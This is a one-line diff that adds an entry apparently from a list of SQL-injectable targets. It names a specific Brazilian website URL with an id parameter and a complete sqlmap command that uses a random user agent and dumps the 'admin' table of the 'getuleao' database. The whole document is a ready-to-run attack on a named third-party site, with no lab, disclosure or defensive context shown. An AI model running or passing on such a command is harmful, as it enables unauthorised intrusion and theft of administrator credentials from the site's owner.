@@ -1,0 +1,1 @@
+http://www.getuleao.com.br/blog-item.php?id=60 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u http://www.getuleao.com.br/blog-item.php?id=60 -D getuleao -T admin --dump
